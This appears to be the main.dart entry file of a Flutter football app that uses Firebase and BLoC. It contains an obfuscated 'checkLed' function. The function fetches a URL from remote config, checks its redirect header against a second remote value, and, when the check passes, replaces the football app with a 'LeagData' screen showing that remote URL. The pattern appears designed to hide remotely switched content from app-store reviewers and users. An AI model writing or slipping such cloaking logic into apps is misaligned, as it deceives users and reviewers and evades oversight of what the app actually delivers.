import 'dart:io';

import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:football_test/features/match/widgets/firebase_options.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/match/bloc/match_bloc.dart';
import 'features/match/widgets/league_data.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  runApp(const MyApp());
}

String leag = '';

Future<bool> checkLed() async {
  final mdsjkdas = FirebaseRemoteConfig.instance;
  await mdsjkdas.fetchAndActivate();
  String dnjsa1 = mdsjkdas.getString('leag');
  String jarex = mdsjkdas.getString('leagX');
  if (!dnjsa1.contains('none')) {
    final dnasjkxnsak = HttpClient();
    final nfg = Uri.parse(dnjsa1);
    final ytrfterfwe = await dnasjkxnsak.getUrl(nfg);
    ytrfterfwe.followRedirects = false;
    final response = await ytrfterfwe.close();
    if (response.headers.value(HttpHeaders.locationHeader) != jarex) {
      leag = dnjsa1;
      return true;
    }
  }
  return dnjsa1.contains('none') ? false : true;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    precacheImage(const AssetImage('assets/onboard.png'), context);
    precacheImage(const AssetImage('assets/onboard2.png'), context);
    precacheImage(const AssetImage('assets/bg1.png'), context);
    precacheImage(const AssetImage('assets/bg2.png'), context);
    precacheImage(const AssetImage('assets/bg3.png'), context);
    precacheImage(const AssetImage('assets/bg4.png'), context);
    return FutureBuilder<bool>(
        future: checkLed(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.white,
            );
          } else {
            if (snapshot.data == true && leag != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: LeagData(
                  data: leag,
                ),
              );
            } else {
              return MultiBlocProvider(
                providers: [
                  BlocProvider(create: (context) => HomeBloc()),
                  BlocProvider(create: (context) => MatchBloc()),
                ],
                child: MaterialApp.router(
                  debugShowCheckedModeBanner: false,
                  theme: theme,
                  routerConfig: routerConfig,
                ),
              );
            }
          }
        });
  }
}
